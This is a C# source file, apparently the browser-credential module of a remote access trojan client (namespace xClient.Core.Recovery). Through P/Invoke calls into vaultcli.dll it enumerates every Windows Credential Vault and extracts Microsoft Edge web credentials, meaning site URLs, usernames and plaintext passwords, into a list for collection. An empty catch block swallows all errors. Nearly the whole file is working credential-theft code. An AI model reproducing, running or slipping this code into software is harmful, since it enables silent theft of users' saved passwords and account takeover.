using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;
using xClient.Core.Data;
using xClient.Core.Recovery.Other;

namespace xClient.Core.Recovery.Browsers
{
    public static class Edge
    {
        [StructLayout(LayoutKind.Sequential, Pack = 4)]
       //[StructLayout(LayoutKind.Sequential)]
        private struct VAULT_ITEM
        {
            public Guid SchemaId;
            public IntPtr CredentialFriendlyName;
            public IntPtr ResourceElement;
            public IntPtr IdentityElement;
            public IntPtr AuthenticatorElement;
            // Win8+ specific
            public IntPtr PackageSid;
            public ulong LastModified;
            public uint Flags;
            public uint PropertiesCount;
            public IntPtr PropertyElements;
        }

        [DllImport("vaultcli.dll", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto)]
        internal static extern int VaultEnumerateVaults(int flags, out int ucount, out IntPtr items);

        [DllImport("vaultcli.dll", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto)]
        internal static extern int VaultEnumerateItems(IntPtr hVault, int flags, out int itemCount, out IntPtr items);

        [DllImport("vaultcli.dll", CallingConvention = CallingConvention.Winapi)]
        internal static extern int VaultOpenVault(IntPtr vaultId, int flags, out IntPtr vaultHandle);

        [DllImport("vaultcli.dll", CallingConvention = CallingConvention.Winapi)]
        internal static extern int VaultGetItem(IntPtr hVault, ref Guid schemaId, IntPtr resource, IntPtr identity, IntPtr packageSid, int owner, int flags, ref IntPtr item);

        [DllImport("vaultcli.dll", CallingConvention = CallingConvention.Winapi)]
        internal static extern int VaultFree(IntPtr pMem);

        [DllImport("vaultcli.dll", CallingConvention = CallingConvention.Winapi)]
        internal static extern int VaultCloseVault(IntPtr hVault);

        private const string VaultWebCredentialId = "3ccd5499-87a8-4b10-a215-608888dd3b55";

        private static bool NtSuccess(int code)
        {
            return code == 0;
        }

        public static List<RecoveredAccount> GetPasswords()
        {
            var retList = new List<RecoveredAccount>();

            try
            {
                int count;
                IntPtr items;
                if (NtSuccess(VaultEnumerateVaults(0, out count, out items)))
                {
                    for (var i = 0; i < count; i++)
                    {
                        IntPtr hVault;
                        if (NtSuccess(VaultOpenVault(items + i*Marshal.SizeOf(typeof(Guid)), 0, out hVault)))
                        {
                            IntPtr pItems;
                            int itemCount;
                            if (
                                NtSuccess(VaultEnumerateItems(hVault, 512 /* VAULT_ENUMERATE_ALL_ITEMS */, out itemCount,
                                    out pItems)))
                            {
                                for (var j = 0; j < itemCount; j++)
                                {
                                    var vaultItem =
                                        (VAULT_ITEM)
                                            Marshal.PtrToStructure(pItems + j*Marshal.SizeOf(typeof(VAULT_ITEM)),
                                                typeof(VAULT_ITEM));
                                    var acc = new RecoveredAccount();

                                    // We're only interested in web credentials
                                    if (vaultItem.SchemaId.Equals(new Guid(VaultWebCredentialId)))
                                    {
                                        acc.Application = "Microsoft Edge";
                                        acc.URL = Marshal.PtrToStringUni(vaultItem.ResourceElement + 32);
                                        acc.Username = Marshal.PtrToStringUni(vaultItem.IdentityElement + 32);

                                        var pPasswVaultItem = IntPtr.Zero;
                                        if (
                                            NtSuccess(VaultGetItem(hVault, ref vaultItem.SchemaId,
                                                vaultItem.ResourceElement,
                                                vaultItem.IdentityElement, IntPtr.Zero, 0, 0,
                                                ref pPasswVaultItem)))
                                        {
                                            var passwVaultItem =
                                                (VAULT_ITEM) Marshal.PtrToStructure(pPasswVaultItem, typeof(VAULT_ITEM));

                                            acc.Password =
                                                Marshal.PtrToStringUni(passwVaultItem.AuthenticatorElement + 32);
                                            VaultFree(pPasswVaultItem);

                                            retList.Add(acc);
                                        }
                                    }
                                }
                            }
                            VaultCloseVault(hVault);
                        }
                    }
                }
            }
            catch
            {
            }

            return retList;
        }
    }
}